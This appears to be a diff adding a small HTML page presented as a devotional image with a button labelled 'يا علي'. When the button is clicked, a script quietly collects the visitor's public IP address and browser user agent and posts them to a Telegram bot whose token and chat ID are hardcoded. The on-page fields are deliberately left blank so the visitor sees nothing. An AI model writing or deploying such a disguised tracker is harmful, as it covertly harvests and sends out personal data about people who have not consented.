@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<title> Hussain </title>
+<body>
+<center>
+<img src="ali.jpg">
+<br><br><br><br>
+<button onclick="getDeviceInfo()">يا علي </button>
+
+<p id="ipAddress"></p>
+<p id="userAgent"></p>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+function getDeviceInfo() {
+
+  axios.get('https://api.ipify.org?format=json')
+    .then(function (response) {
+      var ipAddress = response.data.ip;
+      document.getElementById("ipAddress").innerHTML = "" 
+
+
+      var userAgent = navigator.userAgent;
+      document.getElementById("userAgent").innerHTML = " " ;
+
+
+      var telegramBotToken = '6035544684:AAE1QkNyTtE-mwdwdH5XPCmWkobQs0IzOqE';
+      var chatId = '5333239494';
+      var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage';
+      var message = 'عنوان IP: ' + ipAddress + '\nUser Agent: ' + userAgent;
+
+      axios.post(url, {
+        chat_id: chatId,
+        text: message
+      })
+      .then(function (response) {
+        console.log("تم إرسال عنوان IP و User Agent بنجاح إلى بوت Telegram");
+        console.log(response);
+      })
+      .catch(function (error) {
+        console.log("حدث خطأ أثناء إرسال عنوان IP و User Agent إلى بوت Telegram");
+        console.log(error);
+      });
+    })
+    .catch(function (error) {
+      console.log("حدث خطأ أثناء الاستدعاء");
+      console.log(error);
+    });
+}
+</script>
+
+<style type="text/css">
+
+* {
+background-color :black ;
+
+} 
+
+
+img {
+width :260px ;
+height :300px ;
+
+
+} 
+
+button {
+ color :white ;
+ padding :10px ;
+ border: 1px solid silver ;
+ border-radius :20px ;
+transition :all 0.3s ease ;
+outline :none ;
+} 
+
+
+button:hover {
+background-color :gray ;
+color :red ;
+transition :all 0.3s ease ;
+} 
+
+</style>
+
+
+
+
+</body>
+</html>
